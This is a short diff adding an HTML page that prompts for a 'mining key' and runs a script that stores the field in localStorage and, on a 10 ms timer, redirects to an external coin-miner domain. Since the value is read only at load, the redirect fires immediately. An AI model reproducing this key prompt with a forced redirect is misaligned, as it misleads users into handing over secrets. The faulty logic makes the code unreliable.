@@ -12,7 +12,29 @@
  }
 </style>
 <body>
-
+ <h1>Please enter your mining key:</h1>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <br>
+ <form>
+  <label for="key">Key:</label><br>
+  <input type="text" id="key" name="key">
+</form>
+<script>
+var key = document.getElementById('key').value;
+function check(){ 
+localStorage.setItem("key", key); 
+if(key != null){window.location.replace("http://www.mertcoinminer.ml/");}
+}
+setInterval(check, 10);
+</script> 
 
 
 </body>
